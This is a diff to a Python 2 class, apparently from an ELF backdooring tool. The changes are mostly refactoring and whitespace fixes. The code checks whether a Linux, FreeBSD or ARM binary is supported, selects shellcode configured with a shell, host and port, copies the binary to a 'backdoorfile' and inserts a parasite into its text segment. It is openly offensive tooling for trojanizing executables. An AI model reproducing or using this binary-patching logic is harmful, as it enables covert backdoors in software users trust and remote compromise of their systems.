@@ -98,7 +98,6 @@ class elfbin():
         #print FILE
         self.FILE = FILE
         self.OUTPUT = OUTPUT
-        self.bin_file = open(self.FILE, "r+b")
         self.SHELL = SHELL
         self.HOST = HOST
         self.PORT = PORT
@@ -123,27 +122,28 @@ class elfbin():
                                  [0x03,  # x86
                                   0x3E   # x64
                                   ]],
-				                0x09:    # FreeBSD
+                                0x09:    # FreeBSD
                                 [[0x01,  # 32bit
-                                #  0x02   # 64bit
+                                 # 0x02  # 64bit
                                   ],
                                  [0x03,  # x86
-                                #  0x3E   # x64
+                                  # 0x3E # x64
                                   ]],
                                 0x0C:    # OpenBSD
                                 [[0x01,  # 32bit
-                                #  0x02   # 64bit
+                                 #0x02   # 64bit
                                   ],
                                  [0x03,  # x86
-                                #  0x3E   # x64
-                                 ]]       
-                               }
+                                  #0x3E  # x64
+                                  ]]
+                                }
 
     def run_this(self):
         '''
         Call this if you want to run the entire process with a ELF binary.
         '''
         #self.print_supported_types()
+        self.bin_file = open(self.FILE, "r+b")
         if self.FIND_CAVES is True:
             self.support_check()
             self.gather_file_info()
@@ -167,12 +167,11 @@ class elfbin():
             if self.supported is False:
                 print "%s is not supported." % self.FILE
                 self.print_supported_types()
+                return False
             else:
                 print "%s is supported." % self.FILE
+                return True
 
-            return False
-
-        #self.print_section_name()
         return self.patch_elf()
 
     def find_all_caves(self):
@@ -242,7 +241,7 @@ class elfbin():
         """
         This function sets the shellcode.
         """
-        
+
         self.bintype = False
         if self.e_machine == 0x03:  # x86 chipset
             if self.EI_CLASS == 0x1:
@@ -250,13 +249,13 @@ class elfbin():
                     self.bintype = linux_elfI32_shellcode
                 elif self.EI_OSABI == 0x09 or self.EI_OSABI == 0x0C:
                     self.bintype = freebsd_elfI32_shellcode
-        elif self.e_machine == 0x3E: # x86-64 chipset    
+        elif self.e_machine == 0x3E:  # x86-64 chipset
             if self.EI_CLASS == 0x2:
                 if self.EI_OSABI == 0x00:
                     self.bintype = linux_elfI64_shellcode
                 #elif self.EI_OSABI == 0x09:
                 #    self.bintype = freebsd_elfI64_shellcode
-        elif self.e_machine == 0x28: # ARM chipset
+        elif self.e_machine == 0x28:  # ARM chipset
             if self.EI_CLASS == 0x1:
                 if self.EI_OSABI == 0x00:
                     self.bintype = linux_elfarmle32_shellcode
@@ -518,7 +517,7 @@ class elfbin():
         5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
             into the file - text segment p_offset + p_filesz (original)
         '''
-        
+
         self.support_check()
         if self.supported is False:
             "ELF Binary not supported"
@@ -536,9 +535,9 @@ class elfbin():
 
         shutil.copy2(self.FILE, self.backdoorfile)
 
-        
+
         self.gather_file_info()
-        
+
         print "[*] Getting shellcode length"
 
         resultShell = self.set_shells()
@@ -554,7 +553,7 @@ class elfbin():
         #sh_addr = 0x0
         #offsetHold = 0x0
         #sizeOfSegment = 0x0
-        
+
         headerTracker = 0x0
         PAGE_SIZE = 4096
         #find range of the first PT_LOAD section
@@ -570,7 +569,7 @@ class elfbin():
                 headerTracker = header
                 newOffset = values['p_offset'] + values['p_filesz']
 
-        #now that we have the shellcode startpoint, reassgin shellcode, 
+        #now that we have the shellcode startpoint, reassgin shellcode,
         #  there is no change in size
         print "[*] Setting selected shellcode"
 
